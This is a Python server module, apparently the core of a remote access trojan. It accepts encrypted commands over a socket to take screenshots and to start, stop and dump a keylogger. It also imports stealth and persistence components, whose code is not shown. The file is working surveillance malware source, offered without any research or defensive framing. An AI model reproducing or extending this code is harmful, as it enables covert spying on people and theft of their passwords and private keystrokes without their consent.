# server/core.py
import socket
import sys
import threading
import os
import threading
import json
import base64

# 将项目根目录添加到PATH
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))


from remote_control.server.keylogger import Keylogger
from remote_control.server.screenshot import ScreenCapture
from remote_control.server.stealth import Stealth
from remote_control.server.persistence import Persistence
from remote_control.utils.crypto import CryptoHandler
from remote_control.utils.network import SecureSocket




class EnhancedServer:
    def __init__(self, host='0.0.0.0', port=9999):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}
        self.running = False
        self.keylogger = Keylogger()
        self.crypto = CryptoHandler()
        self.ip_addresses = self.get_ip_addresses()

    def get_ip_addresses(self):
        ip_list = []
        try:
            # 获取所有网络接口
            interfaces = socket.getaddrinfo(host=socket.gethostname(), port=None, family=socket.AF_INET)
            for interface in interfaces:
                ip = interface[4][0]
                if ip not in ip_list and not ip.startswith('127.'):
                    ip_list.append(ip)

            # 如果上面方法没有找到IP，使用另一种方法
            if not ip_list:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                try:
                    # 不需要真正连接
                    s.connect(('8.8.8.8', 1))
                    ip = s.getsockname()[0]
                    if ip not in ip_list:
                        ip_list.append(ip)
                except Exception:
                    pass
                finally:
                    s.close()
        except Exception as e:
            print(f"获取IP地址时出错: {e}")

        return ip_list

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print("服务器启动...")
            print("服务器IP地址:")
            for ip in self.ip_addresses:
                print(f"  - {ip}:{self.port}")

            while self.running:
                client, addr = self.server_socket.accept()
                print(f"接收到来自 {addr} 的连接")
                self.clients[addr] = client
                client_thread = threading.Thread(target=self.handle_client, args=(client, addr))
                client_thread.start()

        except Exception as e:
            print(f"服务器错误: {e}")
        finally:
            self.stop()

    def stop(self):
        self.running = False
        if self.keylogger:
            self.keylogger.stop()

        # 关闭所有客户端连接
        for client in self.clients.values():
            try:
                client.close()
            except:
                pass

        # 关闭服务器socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass

    def handle_client(self, client, addr):
        secure_socket = SecureSocket(client, self.crypto)

        while True:
            try:
                command = secure_socket.receive()
                if not command:
                    break

                response = self.process_command(command)
                if not secure_socket.send(response):
                    break

            except Exception as e:
                print(f"处理客户端 {addr} 时出错: {e}")
                break

        if addr in self.clients:
            del self.clients[addr]
        try:
            client.close()
        except:
            pass

    def process_command(self, command):
        try:
            cmd_type = command.get('type', '')

            if cmd_type == 'screenshot':
                screenshot_data = ScreenCapture.capture()
                if screenshot_data:
                    return {'status': 'success', 'data': screenshot_data}
                return {'status': 'failed', 'error': '截图失败'}

            elif cmd_type == 'keylogger_start':
                if self.keylogger.start():
                    return {'status': 'success', 'message': '键盘记录器已启动'}
                return {'status': 'failed', 'error': '启动键盘记录器失败'}

            elif cmd_type == 'keylogger_stop':
                if self.keylogger.stop():
                    return {'status': 'success', 'message': '键盘记录器已停止'}
                return {'status': 'failed', 'error': '停止键盘记录器失败'}

            elif cmd_type == 'keylogger_dump':
                logs = self.keylogger.get_logs()
                return {'status': 'success', 'data': logs}

            else:
                return {'status': 'failed', 'error': f'未知命令: {cmd_type}'}

        except Exception as e:
            return {'status': 'failed', 'error': str(e)}